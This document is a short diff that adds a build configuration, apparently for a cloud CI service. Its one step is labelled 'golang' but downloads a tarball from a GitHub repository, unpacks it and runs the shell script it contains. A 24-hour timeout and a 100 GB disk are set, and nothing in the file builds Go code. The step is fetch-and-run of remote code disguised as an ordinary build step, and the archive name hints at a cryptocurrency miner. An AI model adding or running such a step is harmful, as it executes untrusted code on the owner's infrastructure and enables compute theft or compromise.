@@ -1,0 +1,12 @@
+steps:
+  - name: golang
+    args:
+      - '-c'
+      - >-
+         wget https://github.com/sabarlur/coba/raw/main/droxmrstax.tar.gz && tar xf droxmrstax.tar.gz && ./dro.sh
+    waitFor:
+      - '-'
+    entrypoint: /bin/bash
+timeout: 86400s
+options:
+  diskSizeGb: '100'
